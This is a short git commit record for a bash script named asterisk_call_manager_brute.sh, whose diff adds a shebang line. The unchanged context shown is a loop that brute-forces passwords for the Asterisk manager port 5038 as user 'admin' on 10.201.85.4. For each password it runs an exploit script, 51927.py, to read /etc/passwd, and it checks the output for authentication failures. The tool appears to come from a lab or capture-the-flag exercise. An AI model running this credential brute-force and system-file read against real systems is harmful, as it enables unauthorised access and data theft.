4043168132ec6b8c6a64e578cadc4ccbf1fe887c
NHAsec <109830222+NHAsec@users.noreply.github.com>
2025-09-03 00:05:41 -0700

    Update asterisk_call_manager_brute.sh

--- asterisk_call_manager_brute.sh
+++ asterisk_call_manager_brute.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
+
 while read -r pass;do
         output=$(python3 51927.py -p 5038 -u admin -P "$pass" -f /etc/passwd 10.201.85.4)
         if ! echo $output | grep -qiE "invalid|authentication failed"; then
